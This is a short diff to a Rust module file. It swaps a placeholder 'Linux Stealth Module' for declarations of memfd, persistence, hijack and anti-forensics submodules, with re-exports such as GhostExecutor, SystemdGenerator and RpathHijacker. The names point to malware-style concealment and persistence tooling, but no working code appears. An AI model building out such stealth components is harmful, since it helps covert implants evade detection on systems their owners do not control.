@@ -1,10 +1,14 @@
-//! # Linux Stealth Module (Placeholder)
-//!
-//! Planned features: LD_PRELOAD, /proc hiding, systemd persistence.
+pub mod memfd;
+pub mod persistence;
+pub mod hijack;
+pub mod anti_forensics;
 
-use log::info;
-
-/// Entry point for Linux stealth
-pub fn check_and_apply_stealth() {
-    info!("[Linux Stealth] Module not yet implemented");
-}
+// Re-exports
+#[cfg(target_os = "linux")]
+pub use memfd::GhostExecutor;
+#[cfg(target_os = "linux")]
+pub use persistence::SystemdGenerator;
+#[cfg(target_os = "linux")]
+pub use hijack::RpathHijacker;
+#[cfg(target_os = "linux")]
+pub use anti_forensics::BindMounter;
